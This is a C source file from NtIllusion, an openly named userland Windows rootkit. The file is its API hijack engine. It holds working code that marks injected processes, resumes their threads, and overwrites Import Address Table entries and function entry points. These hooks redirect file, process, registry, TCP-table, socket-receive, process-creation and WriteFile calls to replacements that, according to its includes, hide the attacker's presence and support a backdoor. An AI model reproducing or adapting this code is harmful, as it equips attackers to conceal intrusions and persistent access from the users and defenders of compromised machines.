/******************************************************************************
  kHijackEng.c	: ROOTKIT *HIJACK ENGINE*
  *****************************************************************************
  Author		: Kdm (Kodmaker@syshell.org)
  WebSite		: http://www.syshell.org

  Copyright (C) 2003,2004 Kdm
  *****************************************************************************
  This file is part of NtIllusion.

  NtIllusion is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.

  NtIllusion is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with NtIllusion; if not, write to the Free Software
  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
  ******************************************************************************/

#include <winsock2.h>				// for socket hijack (kNTIFlow.h)
#include <iprtrmib.h>				// for socket hijack (kNTIFlow.h)
#include <windows.h>				// ;)
#include <tlhelp32.h>				// Tool help 32 functions
#include "kHijackEng.h"				// Hijack engine header
#include "../../Misc/kNTIConfig.h"	// Config file
#include "../../Misc/kNTILib.h"		// Internal runtime
#include "../../Misc/kdbg_IAT.h"	// Runtime Debug
#include "kDisAsm/kEPhook.h"


// Replacement functions :
#include "../../Replacements/Registry/kNTIReg.h"	// registry			(hiding)
#include "../../Replacements/Spawning/kNTISpawn.h"	// process spawning (injection)
#include "../../Replacements/Process/kNTIProcess.h"	// process			(hiding)
#include "../../Replacements/Network/kNTINetHide.h"	// netwok			(hiding)
#include "../../Replacements/Network/kNTIFlow.h"	// netwok			(backdoor)
#include "../../Replacements/Files/kNTIFiles.h"		// files			(hiding)



// Pointers to non-hijacked functions
extern FARPROC fRegEnumValueW;		// Unicode
extern FARPROC fGetProcAddress;
extern FARPROC fCreateProcessW;		// Unicode
extern FARPROC fLoadLibrary;		// Ainsi
extern FARPROC fNtQuerySystemInformation;
extern FARPROC fWSARecv;
extern FARPROC frecv;
// File enumeration
extern FARPROC fFindFirstFileA;		// Ainsi
extern FARPROC fFindNextFileA;		// Ainsi
extern FARPROC fFindFirstFileW;		// Unicode
extern FARPROC fFindNextFileW;		// Unicode
// Network
extern FARPROC fGetTcpTable;
extern FARPROC fAllocateAndGetTcpExTableFromStack;
extern FARPROC fDeviceIoControl;
extern FARPROC fCharToOemBuffA;
extern FARPROC fWriteFile;
extern char ExePath[1024+1];		// full path to current injected exe

extern char* kNTIDllName;
FARPROC fCreateToolhelp32Snapshot;
FARPROC nti_fModule32First;
FARPROC nti_fModule32Next;
FARPROC nti_OpenThread;
FARPROC nti_Thread32First;
FARPROC nti_Thread32Next;



void MarkModuleAsHooked()
{
	PIMAGE_DOS_HEADER pDosHdr=NULL;
	DWORD dwProtect=0, dwNewProtect=0;

	pDosHdr = (PIMAGE_DOS_HEADER) GetModuleHandle(NULL);
	if(!pDosHdr)
	{
		OutputString("Cannot get Dos header address\n");
		return;
	}

	// Grant write access
	VirtualProtect((LPVOID)(&(pDosHdr->e_csum)), sizeof(WORD), PAGE_READWRITE, &dwProtect);
	// Overwrite :)
	pDosHdr->e_csum = NTI_SIGNATURE;
	// Restore previous memory protection
	VirtualProtect((LPVOID)(&(pDosHdr->e_csum)), sizeof(WORD),dwProtect, &dwNewProtect);
}

// Returns 1 if process is already hooked, 0 instead
int IsModuleAlreadyHooked()
{
	PIMAGE_DOS_HEADER pDosHdr=NULL;
	DWORD dwProtect=0, dwNewProtect=0;
	WORD ntiSign=0;

	pDosHdr = (PIMAGE_DOS_HEADER) GetModuleHandle(NULL);
	if(!pDosHdr)
	{
		OutputString("Cannot get Dos header address\n");
		return 0;
	}

	// Grant read access
	VirtualProtect((LPVOID)(&(pDosHdr->e_csum)), sizeof(WORD), PAGE_READONLY, &dwProtect);
	// Read
	ntiSign = pDosHdr->e_csum;
	// Restore previous memory protection
	VirtualProtect((LPVOID)(&(pDosHdr->e_csum)), sizeof(WORD), dwProtect, &dwNewProtect);

	return (ntiSign==NTI_SIGNATURE)? 1 : 0;
}

int WakeUpProcess(DWORD pid)
{
    HANDLE hSnap, hThread;
	DWORD dPID=pid;
	THREADENTRY32 ThEnt = {0};
	HINSTANCE hInstLib=0;

	OutputString("Waking up current process...\n");

	hInstLib = LoadLibrary("kernel32.dll");

	if(!fGetProcAddress)
	{
		OutputString("!fGetProcAddress  !!.\n");
		fGetProcAddress = (FARPROC) GetProcAddress;
	}

	nti_OpenThread = (FARPROC) fGetProcAddress(hInstLib,"OpenThread");

	if(!nti_OpenThread)
	{
		OutputDebugString("!OpenThread\n");
		return 0;
	}


	fCreateToolhelp32Snapshot   = (FARPROC) fGetProcAddress(hInstLib,"CreateToolhelp32Snapshot");
	nti_Thread32First			= (FARPROC) fGetProcAddress(hInstLib, "Thread32First");
	nti_Thread32Next			= (FARPROC) fGetProcAddress(hInstLib, "Thread32Next");
	
	if(!fCreateToolhelp32Snapshot || !nti_Thread32First || !nti_Thread32Next)
	{
		OutputString("Resolve failed.\n");
		return 0;
	}

	ThEnt.dwSize = sizeof(THREADENTRY32);

	hSnap = (HANDLE) (*fCreateToolhelp32Snapshot)(TH32CS_SNAPTHREAD, dPID);

	if(hSnap == INVALID_HANDLE_VALUE)
	{
		OutputString("CreateToolhelp32Snapshot ERROR\n");
		return 0;
	}

	if ((*nti_Thread32First)(hSnap, &ThEnt)) 
    { 
        do 
        { 
            if (ThEnt.th32OwnerProcessID == dPID) 
            { 
				hThread = (HANDLE) (*nti_OpenThread)(THREAD_SUSPEND_RESUME, FALSE, ThEnt.th32ThreadID);
				if(hThread)
				{
					ResumeThread(hThread);
				}
            } 
        } 
        while ((*nti_Thread32Next)(hSnap, &ThEnt)); 
    } 
	FreeLibrary(hInstLib);
	CloseHandle(hSnap);
	return 1;
}


FARPROC WINAPI MyGetProcAddress(HMODULE hModule, LPCSTR lpProcName)
{
/*
	char tmp[256], str[256];	// temp string / non unicode string
	DWORD OldProtect;
	HANDLE hMod;

	//The following lines try to retrieve lpPrcName content whatever its memory protection :
	VirtualProtect((void*)lpProcName, 8, PAGE_EXECUTE_READWRITE, &OldProtect);
	hMod = GetCurrentProcess();
	if(hMod==0)	
		goto end;
	my_memset(tmp, 0, 256);
	my_memset(str, 0, 256);
	// for some reason, lpProcName is sometimes in a locked memory state, in this case, we skip.
	if(!ReadProcessMemory( hMod, (void*)lpProcName, (void*)tmp, 40, 0))	
		goto end;

	//Convert strings from unicode :
	WideCharToMultiByte(CP_ACP, 0,(const unsigned short *)lpProcName, -1, str, 255,NULL, NULL);
	OutputString("GetProcAddress => %s\n", lpProcName);



//	if(!stricmp(lpProcName, "GetProcAddress") || !stricmp(tmp, "GetProcAddress"))
//		return (FARPROC)MyGetProcAddress;


	//if(!stricmp(lpProcName, "CreateProcessW") || !stricmp(tmp, "CreateProcessW"))
	//	return (FARPROC)MyCreateProcessW;

	if(!stricmp(lpProcName, "LoadLibraryA") || !stricmp(tmp, "LoadLibraryA"))
		return (FARPROC)MyLoadLibrary;
	if(!stricmp(lpProcName, "NtQuerySystemInformation") || !stricmp(tmp, "NtQuerySystemInformation"))
		return (FARPROC)MyNtQuerySystemInformation;
	if(!stricmp(lpProcName, "RegEnumValueW") || !stricmp(tmp, "RegEnumValueW"))
		return (FARPROC)MyRegEnumValue;

	if(!stricmp(lpProcName, "FindFirstFileA") || !stricmp(tmp, "FindFirstFileA"))
		return (FARPROC)MyFindFirstFileA;
	if(!stricmp(lpProcName, "FindFirstFileW") || !stricmp(tmp, "FindFirstFileW"))
		return (FARPROC)MyFindFirstFileW;
	if(!stricmp(lpProcName, "FindNextFileA") || !stricmp(tmp, "FindNextFileA"))
		return (FARPROC)MyFindNextFileA;
	if(!stricmp(lpProcName, "FindNextFileW") || !stricmp(tmp, "FindNextFileW"))
		return (FARPROC)MyFindNextFileW;


	if(!stricmp(lpProcName, "GetTcpTable") || !stricmp(tmp, "GetTcpTable"))
		return (FARPROC)MyGetTcpTable;

	if(!stricmp(lpProcName, "AllocateAndGetTcpExTableFromStack") 
		|| !stricmp(tmp, "AllocateAndGetTcpExTableFromStack"))
			return (FARPROC)MyAllocateAndGetTcpExTableFromStack;
end :
*/
	// This seems not to be an "hijack escape" try
  return (FARPROC) fGetProcAddress(hModule, lpProcName);
}
 

// This function patches all APIs for a module of the current process by
// delegatating the task to HijackApi
int HijackApiOfNewModule(HMODULE hLocalModule, const char* ModuleName, char *ExePath)
{
	int result;
	result = 0;
	//if(VERBOSE_API_LIST) OutputString("\nInspecting '%s' (%s)\n", ModuleName, (char*)ExePath);

	// o Hijack GetProcAddress :
	//result = HijackApiEx((hLocalModule), "KERNEL32.DLL", "GetProcAddress", ((VOID*)&MyGetProcAddress), ((VOID**)&fGetProcAddress));
	//ShowResultOfHijack(result, "GetProcAddress", ExePath, (char*)ModuleName);

	// o Hijack CreateProcessW :
	//result = HijackApiEx((hLocalModule), "kernel32.dll", "CreateProcessW", ((VOID*)&MyCreateProcessW), ((VOID**)&fCreateProcessW));
	//ShowResultOfHijack(result, "CreateProcessW", ExePath, (char*)ModuleName);
/*
	// o Hijack LoadLibraryA :
	result = HijackApi((hLocalModule), "KERNEL32.DLL", "LoadLibraryA", ((VOID*)&MyLoadLibrary), ((VOID**)&fLoadLibrary));
	ShowResultOfHijack(result, "LoadLibraryA", ExePath, (char*)ModuleName);


	// o Hijack NtQuerySystemInformation :
	result = HijackApi((hLocalModule), "NTDLL.DLL", "NtQuerySystemInformation", ((VOID*)&MyNtQuerySystemInformation), ((VOID**)&fNtQuerySystemInformation));
	ShowResultOfHijack(result, "NtQuerySystemInformation", ExePath, (char*)ModuleName);

	// o Hijack RegEnumValueW :
	result = HijackApi((hLocalModule), "ADVAPI32.DLL", "RegEnumValueW", (PVOID)&MyRegEnumValue, (PVOID*)&fRegEnumValueW);
	ShowResultOfHijack(result, "RegEnumValueW", ExePath, (char*)ModuleName);


	// o Hijack recv :
	result = HijackApi((hLocalModule), "wsock32.dll", "recv", (PVOID)&Myrecv, (PVOID*)&frecv);
	ShowResultOfHijack(result, "recv", ExePath, (char*)ModuleName);

	// o Hijack WSARecv :
	result = HijackApi((hLocalModule), "ws2_32.dll", "WSARecv", (PVOID)&MyWSARecv, (PVOID*)&fWSARecv);
	ShowResultOfHijack(result, "WSARecv", ExePath, (char*)ModuleName);


	// o Hijack FindFirstFileA :
	result = HijackApi((hLocalModule), "KERNEL32.DLL", "FindFirstFileA", (PVOID)&MyFindFirstFileA, (PVOID*)&fFindFirstFileA);
	ShowResultOfHijack(result, "FindFirstFileA", ExePath, (char*)ModuleName);
	
	// o Hijack FindNextFileA :
	result = HijackApi((hLocalModule), "KERNEL32.DLL", "FindNextFileA", (PVOID)&MyFindNextFileA, (PVOID*)&fFindNextFileA);
	ShowResultOfHijack(result, "FindNextFileA", ExePath, (char*)ModuleName);

	// o Hijack FindFirstFileW :
	result = HijackApi((hLocalModule), "KERNEL32.DLL", "FindFirstFileW", (PVOID)&MyFindFirstFileW, (PVOID*)&fFindFirstFileW);
	ShowResultOfHijack(result, "FindFirstFileW", ExePath, (char*)ModuleName);
	// o Hijack FindNextFileW :
	result = HijackApi((hLocalModule), "KERNEL32.DLL", "FindNextFileW", (PVOID)&MyFindNextFileW, (PVOID*)&fFindNextFileW);
	ShowResultOfHijack(result, "FindNextFileW", ExePath, (char*)ModuleName);

	
	// o Hijack GetTcpTable :
	result = HijackApi((hLocalModule), "IPHLPAPI.DLL", "GetTcpTable", (PVOID)&MyGetTcpTable, (PVOID*)&fGetTcpTable);
	ShowResultOfHijack(result, "GetTcpTable", ExePath, (char*)ModuleName);

	// o Hijack AllocateAndGetTcpExTableFromStack :
	result = HijackApi((hLocalModule), "IPHLPAPI.DLL", "AllocateAndGetTcpExTableFromStack", (PVOID)&MyAllocateAndGetTcpExTableFromStack, (PVOID*)&fAllocateAndGetTcpExTableFromStack);
	ShowResultOfHijack(result, "AllocateAndGetTcpExTableFromStack", ExePath, (char*)ModuleName);


	// o Hijack DeviceIoControl :
	result = HijackApi((hLocalModule), "kernel32.dll", "DeviceIoControl", (PVOID)&MyDeviceIoControl, (PVOID*)&fDeviceIoControl);
	ShowResultOfHijack(result, "DeviceIoControl", ExePath, (char*)ModuleName);

	// o Hijack CharToOemBuffA :
	result = HijackApi((hLocalModule), "USER32.DLL", "CharToOemBuffA", (PVOID)&MyCharToOemBuff, (PVOID*)&fCharToOemBuffA);
	ShowResultOfHijack(result, "CharToOemBuffA", ExePath, (char*)ModuleName);

	// o Hijack LogonUserA :
	//result = HijackApi((hLocalModule), "ADVAPI32.DLL", "LogonUserA", (PVOID)&MyLogonUser, (PVOID*)&fLogonUser);
	//ShowResultOfHijack(result, "LogonUserA", ExePath, (char*)ModuleName);

	// o Hijack CreateProcessWithLogonW :
	//result = HijackApi((hLocalModule), "ADVAPI32.DLL", "CreateProcessWithLogonW", (PVOID)&MyCreateProcessWithLogonW, (PVOID*)&fCreateProcessWithLogonW);
	//ShowResultOfHijack(result, "CreateProcessWithLogonW", ExePath, (char*)ModuleName);

	// o Hijack WriteFile ?
if( (!WriteFile_FPORT_ONLY) || (WriteFile_FPORT_ONLY && strstr(ExePath,(char*)NTILLUSION_TARGET_FPORT)!=0))
{
	result = HijackApi((hLocalModule), "KERNEL32.DLL", "WriteFile", (PVOID)&MyWriteFile, (PVOID*)&fWriteFile);
	ShowResultOfHijack(result, "WriteFile", ExePath, (char*)ModuleName);
}
*/
	return 1;
}

int HookApi(char* DllName, char* FuncName, DWORD ReplacementFunc, FARPROC* pFunc)
{
  BYTE* CG_Func=NULL;
  FARPROC funcGetProcAddress=NULL;
  int ret=0;

  if(fGetProcAddress==NULL)
	  funcGetProcAddress = (FARPROC)GetProcAddress;
  else
	  funcGetProcAddress = fGetProcAddress;

  (*pFunc) = (FARPROC) funcGetProcAddress(GetModuleHandle(DllName), FuncName);
  if((*pFunc))
  {
	if(ForgeHook((DWORD)(*pFunc), (DWORD)ReplacementFunc, (byte**)&CG_Func))
	{
		ret = 1;
		(*pFunc) = (FARPROC) CG_Func;
	}
  }

  return ret;
}

/*
	SetUpHooks : This proc sets up hook for current process.

It performs checks in order not to rehook functions for a given dll. 
This behaviour is designed for a call inside a MyLoadLibraryA/W/Ex function,
to hook functions of the new dll to load. (Flag==NTI_ON_NEW_DLL)
Nevertheless, if flag NTI_ON_ROOTKIT_LOAD is specified, these checks are disabled and all
functions are hooked for all Dlls
*/
void SetUpHooks(int Flag, char* Dll)
{
  int result=0;
  
  // Hook APIs, by Dlls, but only if dll isn't already loaded and NTI_ON_ROOTKIT_LOAD flag isn't
  // set
  if( (Flag!=NTI_ON_ROOTKIT_LOAD) && Dll)
	  OutputString("<!> Hooking '%s'...\n", Dll);

  if(Flag==NTI_ON_ROOTKIT_LOAD || (Dll && strstr(Dll, "kernel32.dll"))) // dll name in LOWER CASE !!!
  {
	if(SPREAD_ACROSS_USERLAND)
	{
	  // Place all hooks for kernel32.dll here
	  result = HookApi("kernel32.dll", "CreateProcessW", (DWORD)&MyCreateProcessW, &fCreateProcessW);
	  ShowResultOfHijack(result, "CreateProcessW", "!", (char*)"!");
	}
	
	  result = HookApi("kernel32.dll", "GetProcAddress", (DWORD)&MyGetProcAddress, &fGetProcAddress);
	  ShowResultOfHijack(result, "GetProcAddress", "!", (char*)"!");

	  result = HookApi("kernel32.dll", "LoadLibraryA", (DWORD)&MyLoadLibrary, &fLoadLibrary);
	  ShowResultOfHijack(result, "LoadLibraryA", "!", (char*)"!");


	  result = HookApi("kernel32.dll", "FindFirstFileA", (DWORD)&MyFindFirstFileA, &fFindFirstFileA);
	  ShowResultOfHijack(result, "FindFirstFileA", "!", (char*)"!");

	  result = HookApi("kernel32.dll", "FindNextFileA", (DWORD)&MyFindNextFileA, &fFindNextFileA);
	  ShowResultOfHijack(result, "FindNextFileA", "!", (char*)"!");
	  
	  result = HookApi("kernel32.dll", "FindFirstFileW", (DWORD)&MyFindFirstFileW, &fFindFirstFileW);
	  ShowResultOfHijack(result, "FindFirstFileW", "!", (char*)"!");

	  result = HookApi("kernel32.dll", "FindNextFileW", (DWORD)&MyFindNextFileW, &fFindNextFileW);
	  ShowResultOfHijack(result, "FindNextFileW", "!", (char*)"!");

	  result = HookApi("kernel32.dll", "DeviceIoControl", (DWORD)&MyDeviceIoControl, &fDeviceIoControl);
	  ShowResultOfHijack(result, "DeviceIoControl", "!", (char*)"!");
	  
	  if( (!WriteFile_FPORT_ONLY) || (WriteFile_FPORT_ONLY && strstr(ExePath,(char*)NTILLUSION_TARGET_FPORT)!=0))
	  {
		result = HookApi("kernel32.dll", "WriteFile", (DWORD)&MyWriteFile, &fWriteFile);
		ShowResultOfHijack(result, "WriteFile", "!", (char*)"!");
	  }
  }

  if(Flag==NTI_ON_ROOTKIT_LOAD || (Dll && strstr(Dll, "user32.dll")))
  {
	  result = HookApi("user32.dll", "CharToOemBuffA", (DWORD)&MyCharToOemBuff, &fCharToOemBuffA);
	  ShowResultOfHijack(result, "CharToOemBuffA", "!", (char*)"!");
  }

  if(Flag==NTI_ON_ROOTKIT_LOAD || (Dll && strstr(Dll, "ntdll.dll")))
  {
	  result = HookApi("ntdll.dll", "NtQuerySystemInformation", (DWORD)&MyNtQuerySystemInformation, &fNtQuerySystemInformation);
	  ShowResultOfHijack(result, "NtQuerySystemInformation", "!", (char*)"!");
  }

  if(Flag==NTI_ON_ROOTKIT_LOAD || (Dll && strstr(Dll, "advapi32.dll")))
  {

	  result = HookApi("advapi32.dll", "RegEnumValueW", (DWORD)&MyRegEnumValue, &fRegEnumValueW);
	  ShowResultOfHijack(result, "RegEnumValueW", "!", (char*)"!");

  }
  
  if(Flag==NTI_ON_ROOTKIT_LOAD || (Dll && strstr(Dll, "wsock32.dll")))
  {
	  result = HookApi("wsock32.dll", "recv", (DWORD)&Myrecv, &frecv);
	  ShowResultOfHijack(result, "recv", "!", (char*)"!");

  }

  if(Flag==NTI_ON_ROOTKIT_LOAD || (Dll && strstr(Dll, "ws2_32.dll")))
  {
	  result = HookApi("ws2_32.dll", "WSARecv", (DWORD)&MyWSARecv, &fWSARecv);
	  ShowResultOfHijack(result, "WSARecv", "!", (char*)"!");
  }


  if(Flag==NTI_ON_ROOTKIT_LOAD || (Dll && strstr(Dll, "iphlpapi.dll")))
  {
	  result = HookApi("iphlpapi.dll", "GetTcpTable", (DWORD)&MyGetTcpTable, &fGetTcpTable);
	  ShowResultOfHijack(result, "GetTcpTable", "!", (char*)"!");

	  result = HookApi("iphlpapi.dll", "AllocateAndGetTcpExTableFromStack", (DWORD)&MyAllocateAndGetTcpExTableFromStack, &fAllocateAndGetTcpExTableFromStack);
	  ShowResultOfHijack(result, "AllocateAndGetTcpExTableFromStack", "!", (char*)"!");
  }

/*
  if(Flag==NTI_ON_ROOTKIT_LOAD || (Dll && strstr(Dll, "X.dll")))
  {
	  result = HookApi("", "", (DWORD)&, &);
	  ShowResultOfHijack(result, "", "!", (char*)"!");
  }
  */


}

// Perform HijackApiOfNewModule() for each module of the current process
int FixAllModules(char* ExePath)
{
  DWORD pID = 0; //Process identifier, 0 for self
  HANDLE hSnap;
  MODULEENTRY32 mentry;
  int bentry=1;
  HINSTANCE hInstLib=0;

  hInstLib = LoadLibrary("kernel32.dll");
  
  if( hInstLib == NULL )
	  return 1;
  
  // Resolve functions addresses using the true GetProcAddress (not already hijacked!)
  fCreateToolhelp32Snapshot = (FARPROC) GetProcAddress(hInstLib,"CreateToolhelp32Snapshot");
  nti_fModule32First		= (FARPROC) GetProcAddress(hInstLib,"Module32First");
  nti_fModule32Next			= (FARPROC) GetProcAddress(hInstLib, "Module32Next");

  if(!fCreateToolhelp32Snapshot || !nti_fModule32First || !nti_fModule32Next ) 
	  return 1;

  hSnap = (HANDLE)(*fCreateToolhelp32Snapshot)(TH32CS_SNAPMODULE, pID);
  mentry.dwSize=sizeof(MODULEENTRY32);
  bentry = (*nti_fModule32First)(hSnap, &mentry);

  if(!VERBOSE_HIJACK_RESULT)	OutputString("[i] The result of the hijack won't be shown (VERBOSE_HIJACK_RESULT turned off)\n");
  if(!VERBOSE_API_LIST)			OutputString("[i] APIs of the process being hijacked won't be shown (VERBOSE_API_LIST turned off)\n");


//CheckAllImportedFunctionsForModule((DWORD)GetModuleHandle(NULL));


  while(bentry)
  {
	  my_strtolower((char*)(mentry.szModule)); 
	  if(!my_strcmp(((char*)(mentry.szModule)), (char*)kNTIDllName)){
		//if(VERBOSE_API_LIST) 
			OutputString("\nSkipping our DLL...\n");
		goto next;
      }
	  if(VERBOSE_HIJACK_RESULT) OutputString("----------------------------------------[ %s ]\n", (char*)mentry.szModule);
	  HijackApiOfNewModule( (HMODULE)mentry.modBaseAddr, (char*)mentry.szModule, (char*)ExePath );

	  if(!my_strcmp(((char*)(mentry.szModule)), "kernel32.dll"))
	  {
			OutputString("\nDumping IAT to debug explorer\n");
			//DumpIATOfModule(((char*)(mentry.szModule)));
      }
      
	  next:
      mentry.dwSize=sizeof(MODULEENTRY32);
      bentry= (*nti_fModule32Next)(hSnap,&mentry);
  }

  FreeLibrary(hInstLib);
  CloseHandle(hSnap);
  return 0;
}

//	HijackApi : this function is used by NT Illusion to hijack calls to strategic APIs
//	This source code is based on Oleg Kagan's sample "Example of interception of an API or any DLL function call
//	(July 23, 1998)". I made the source simpler to understand.
//	Kdm (kodmaker@netcourrier.com) 08/2002
int HijackApi(HMODULE hLocalModule, const char *DllName, const char *ApiName, PVOID pApiNew, PVOID *ApiOrg)
{
	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)hLocalModule;
    PIMAGE_NT_HEADERS pNTHeader;
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
	PIMAGE_THUNK_DATA pThunk; //define a pointer to IMAGE_THUNK_DATA (stores API address)
    DWORD dwProtect=0, dwNewProtect=0;
	int ret = 0;
	//Get real API address in memory to be able to find it in IAT
	DWORD dwAddressToIntercept = (DWORD)fGetProcAddress(GetModuleHandle((char*)DllName), (char*)ApiName);
	//OutputString("%s/%s -> 0x%x\n", DllName, ApiName, dwAddressToIntercept);
	if (pDOSHeader->e_magic != IMAGE_DOS_SIGNATURE) return 0;//Check signature of DOS header (0x5A4D/MZ)

    pNTHeader = MakePtr(PIMAGE_NT_HEADERS, pDOSHeader, pDOSHeader->e_lfanew); //Set pointer to IMAGE_NT_HEADERS structure
    if (pNTHeader->Signature != IMAGE_NT_SIGNATURE) return 0; //Check signature of NT header (0x00004550/PE00)
    
	//Set pointer to IMAGE_IMPORT_DESCRIPTOR structure
    pImportDesc = MakePtr(PIMAGE_IMPORT_DESCRIPTOR, hLocalModule, 
		pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); //Build pointer to Import Table
	
    //Walk Import Table
	while (pImportDesc->Name) { //for each Dll (while name field isn't blank)
    	pThunk = MakePtr( PIMAGE_THUNK_DATA, hLocalModule, pImportDesc->FirstThunk); //set pointer to IAT for this Dll
		//Walk IAT
		while (pThunk->u1.Function) { //for each imported API :
			//OutputString("-> 0x%x\n", ((DWORD)(pThunk->u1.Function)));
			if (((DWORD)(pThunk->u1.Function)) == ((DWORD)(dwAddressToIntercept))) {	//check if address matches or not
				//It matches, so :
				if (ApiOrg) *ApiOrg = (void*)(pThunk->u1.Function); //save genuine API address for later use
				//Unlock read only memory protection
				VirtualProtect((LPVOID)(&pThunk->u1.Function), sizeof(DWORD),PAGE_EXECUTE_READWRITE, &dwProtect);//unlock memory protection
				(DWORD*)pThunk->u1.Function = (DWORD*)pApiNew; //OVERWRITE API address ! :)
				//Restore previous memory protection
				VirtualProtect((LPVOID)(&pThunk->u1.Function), sizeof(DWORD),dwNewProtect, &dwProtect);
				ret = 1; //set success for return
			} 
			pThunk++; //next API
		} 
		pImportDesc++; //next dll.
	}
    return ret;
} 


// Scan through IAT and patches target function entry point address
// It uses function name comparison instead of entry point address comparison
// because explorer handles oddly some API at load time
int HijackApiEx(HMODULE hLocalModule, const char *ntiDllName, const char *ntiApiName,
 PVOID pApiNew, PVOID *ApiOrg)
{
    PIMAGE_DOS_HEADER pDOSHeader;
    PIMAGE_NT_HEADERS pNTHeaders;
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;// Dll name chunk
    PIMAGE_THUNK_DATA pIAT;              // Functions address chunk
    PIMAGE_THUNK_DATA pINT;              // Functions names array
    PIMAGE_IMPORT_BY_NAME pImportName;   // Function Name 
    PIMAGE_THUNK_DATA pIteratingIAT;
    char* DllName=NULL;
    DWORD IAT_funcAddr=0;                // fonction entry point in IAT
    DWORD GPR_funcAddr=0;                // function entry point with GetProcAddress
    unsigned int cFuncs=0;
    DWORD dwProtect=0, dwNewProtect=0;
    int i=0, ret=0;
	DWORD dwBase;
    
    
    // Init
	dwBase = (DWORD)hLocalModule;
    pDOSHeader = (PIMAGE_DOS_HEADER) dwBase;
    // Check dos header signature
    if(pDOSHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return 0;

    pNTHeaders = MakePtr(PIMAGE_NT_HEADERS, pDOSHeader, pDOSHeader->e_lfanew);
    // Check NT header signature
    if(pNTHeaders->Signature != IMAGE_NT_SIGNATURE)
        return 0;

    // Localize Import table
    pImportDesc = MakePtr(PIMAGE_IMPORT_DESCRIPTOR, dwBase, pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    if(pImportDesc == (PIMAGE_IMPORT_DESCRIPTOR)pNTHeaders) 
		return 0;
      
    // For each imported DLL
    while(pImportDesc->Name) 
	{    
	    DllName = MakePtr(char*, dwBase, pImportDesc->Name);
	    
		// check if it's the wanted dll
	    if(!_stricmp(ntiDllName, DllName))
        {       

			// Set up Import Name/Address Table pointers for this dll
			pINT = MakePtr(PIMAGE_THUNK_DATA, dwBase, pImportDesc->OriginalFirstThunk );
			pIAT = MakePtr(PIMAGE_THUNK_DATA, dwBase, pImportDesc->FirstThunk );
			cFuncs = 0;
			
			// Count how many entries there are in this IAT.  Array is 0 terminated
			pIteratingIAT = pIAT;  
			while ( pIteratingIAT->u1.Function )
			{
				 cFuncs++;
				 pIteratingIAT++;
			}
    
			if ( cFuncs != 0 ) 
			{
				// Scan through the IAT
				pIteratingIAT = pIAT;	        
				while ( pIteratingIAT->u1.Function )
				{
					// Check that function is imported by name
					if ( !IMAGE_SNAP_BY_ORDINAL( pINT->u1.Ordinal ) )
					{
						pImportName = MakePtr(PIMAGE_IMPORT_BY_NAME, dwBase, pINT->u1.AddressOfData);

						// Check if it's the target API                
						if(!_stricmp(ntiApiName, ((char*)pImportName->Name)))
						{

							// OK, this is the target API
							// save genuine API address for later use                
							if (ApiOrg)
								 *ApiOrg = (void*)(pIteratingIAT->u1.Function);
							
							//Unlock read only memory protection
							VirtualProtect((LPVOID)(&pIteratingIAT->u1.Function), sizeof(DWORD),PAGE_EXECUTE_READWRITE, &dwProtect);
							//OVERWRITE API address ! :)
							(DWORD*)pIteratingIAT->u1.Function = (DWORD*)pApiNew; 
							//Restore previous memory protection
							VirtualProtect((LPVOID)(&pIteratingIAT->u1.Function), sizeof(DWORD),dwProtect, &dwNewProtect);
							return 1;
						}
					}    
            
					pIteratingIAT++; // jump to next IAT entry
					pINT++;          // jump to next INT entry
				} // end for each function
			} // end if there's functions in this IAT
		} // end if it's the correct dll

		pImportDesc++;  // jump to next dll
	} // end while (for each DLL)

    return ret;
}


// This functions sends to Debugger (ie. DebugView) the information concerning the hijack of each API
void ShowResultOfHijack(int result, char* ApiName, char* ExePath, const char* ModuleName)
{
if(!VERBOSE_HIJACK_RESULT) return;
	if(!result)
		OutputString("[/] Cannot hijack %s in '%s'/'%s'\n", ApiName, (char*)ExePath, (char*)ModuleName); 
	else
		OutputString("[o] %s HIJACKED in '%s'/'%s'\n", ApiName, (char*)ExePath, (char*)ModuleName); 
	return;
}

